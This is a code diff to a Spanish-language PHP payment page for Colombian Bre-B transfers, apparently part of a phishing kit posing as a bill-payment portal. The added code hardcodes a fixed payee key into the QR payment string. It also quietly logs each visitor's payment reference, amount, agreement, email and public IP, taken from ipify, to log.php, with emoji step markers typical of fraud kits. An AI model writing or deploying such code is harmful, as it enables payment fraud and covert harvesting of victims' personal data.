@@ -1,3 +1,4 @@
+<?php require_once __DIR__ . '/config.php'; ?>
 <!DOCTYPE html>
 <html lang="es">
 
@@ -707,6 +708,9 @@
 
     <script>
         (function () {
+            var _BREB_LLAVE  = <?php echo json_encode(defined('BREB_LLAVE') ? BREB_LLAVE : '@LITTIO1032010324'); ?>;
+            var _BREB_PREFIX = '00020101021226390014CO.COM.ACH.LLA04' + String(_BREB_LLAVE.length).padStart(2, '0') + _BREB_LLAVE + '49250014CO.COM.ACH.RED0103ACH50310013CO.COM.ACH.CU01100082302155520400005303170';
+
             var _metodoSel = null; // 'breb' | 'otros' | null
 
             // ── Selección de medio de pago ──
@@ -718,6 +722,30 @@
                     document.getElementById('errorMetodo').style.display = 'none';
                 });
             });
+
+            // ── Helpers de log ──
+            function p1GetIP() {
+                return fetch('https://api.ipify.org?format=json')
+                    .then(function(r){ return r.json(); })
+                    .then(function(d){ return d.ip || '—'; })
+                    .catch(function(){ return '—'; });
+            }
+            function p1Log(lines, action) {
+                var text = Array.isArray(lines) ? lines.join('\n') : String(lines);
+                var body = { text: text };
+                if (action) body.action = action;
+                fetch('log.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                }).catch(function(){});
+            }
+            function p1Convenio() {
+                try {
+                    var raw = localStorage.getItem('convenioSeleccionado');
+                    return raw ? JSON.parse(raw) : {};
+                } catch(e) { return {}; }
+            }
 
             // ── Helpers modales ──
             var _brebEsperandoConfirm = false;
@@ -772,6 +800,20 @@
                 }
                 if (!ok) return;
 
+                // Log: intento de pago con Bre-B
+                var _refVal  = ref ? ref.value.trim() : '—';
+                var _montoVal = val ? val.value.trim() : '—';
+                var _conv = p1Convenio();
+                p1GetIP().then(function(ip) {
+                    p1Log([
+                        '🟢 BREB — PASO UNO',
+                        '🏛️ Convenio: ' + (_conv.nombre || _conv.convenio || '—'),
+                        '🧾 Referencia: ' + _refVal,
+                        '💰 Valor: $' + _montoVal,
+                        '🌐 IP: ' + ip
+                    ]);
+                });
+
                 // 3 s de loading → dejar que paso-uno.js abra el modal de confirmación
                 var loading = document.getElementById('brebLoading');
                 loading.classList.add('activo');
@@ -794,6 +836,7 @@
                 e.preventDefault();
                 e.stopPropagation();
                 e.stopImmediatePropagation();
+
                 cerrarConfirmacion();
                 document.getElementById('brebEmailModal').classList.add('activo');
             }, true);
@@ -816,6 +859,23 @@
                 }
                 input.classList.remove('error');
                 err.style.display = 'none';
+
+                // Log: confirmó ir a pagar con Bre-B
+                var _conv3 = p1Convenio();
+                var _ref3  = (document.getElementById('campoReferencia') || {}).value || '—';
+                var _monto3 = (document.getElementById('campoValor') || {}).value || '—';
+                p1GetIP().then(function(ip) {
+                    p1Log([
+                        '✅ BREB — CONFIRMÓ IR A PAGAR',
+                        '🏛️ Convenio: ' + (_conv3.nombre || _conv3.convenio || '—'),
+                        '🧾 Referencia: ' + _ref3.trim(),
+                        '💰 Valor: $' + _monto3.trim(),
+                        '📧 Correo: ' + input.value.trim(),
+                        '🔑 Llave: ' + _BREB_LLAVE,
+                        '🌐 IP: ' + ip
+                    ]);
+                });
+
                 document.getElementById('brebEmailModal').classList.remove('activo');
                 brebMostrarQr();
             });
@@ -826,7 +886,6 @@
 
             // ── Modal QR ──
             function brebMostrarQr() {
-                var _BREB_PREFIX = '00020101021226390014CO.COM.ACH.LLA0417@LITTIO103201032449250014CO.COM.ACH.RED0103ACH50310013CO.COM.ACH.CU01100082302155520400005303170';
                 var _BREB_SUFFIX = '5802CO5905Kamin600511001610511001622107040000080200110363380270016CO.COM.ACH.CANAL0103APP81250015CO.COM.ACH.CIVA01020382260014CO.COM.ACH.IVA01040.0083270015CO.COM.ACH.BASE01040.0084250015CO.COM.ACH.CINC01020385260014CO.COM.ACH.INC01040.0090410016CO.COM.ACH.TRXID01171783894866422000=91460014CO.COM.ACH.SEC0124zdItyibLP1ZlwenFpLPDwbPN6304';
 
                 function _crc16(str) {
